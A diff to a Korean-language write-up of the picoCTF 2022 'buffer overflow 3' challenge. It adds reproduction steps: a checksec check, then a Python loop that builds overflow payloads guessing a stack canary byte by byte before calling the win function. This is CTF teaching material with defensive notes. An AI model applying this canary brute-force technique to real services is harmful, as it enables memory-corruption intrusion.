@@ -1,7 +1,7 @@
 ---
 title: buffer overflow 3 — picoCTF 2022 pwn writeup
 created: 2026-06-15
-updated: 2026-06-15
+updated: 2026-06-16
 type: query
 tags: [ctf, pwn, stack-canary, brute-force, buffer-overflow, win-function, picoctf]
 sources: [https://picoctf2022.haydenhousen.com/binary-exploitation/buffer-overflow-3, https://qiita.com/housu_jp/items/f6b9e0dedf555f7288ce, https://cryptocat.me/blog/ctf/2022/pico/pwn/buffer_overflow_3/]
@@ -93,6 +93,23 @@ io.sendafter(b'Input> ', payload)
 io.interactive()  # flag 출력 확인
 ```
 
+
+## 재현 절차
+
+1. canary 보호 여부를 확인합니다.
+```bash
+# canary 유무를 먼저 확인합니다.
+checksec --file=./vuln    # 예상: Canary가 활성화되어 있는지 출력됩니다.
+```
+2. canary를 하나씩 추측하는 루프를 구성합니다.
+```python
+# brute force 루프의 형태를 확인합니다.
+from pwn import *
+for guess in range(256):              # 예상: 바이트 단위 추측을 반복합니다.
+    payload = b"A" * 64 + bytes([guess])
+    print(payload)
+```
+3. canary 복원이 되면 최종적으로 win 경로를 호출합니다.
 ## 6. 방어 관점 메모
 
 - 에러 메시지나 크래시 여부만으로도 카나리 복원이 가능하면 위험합니다.
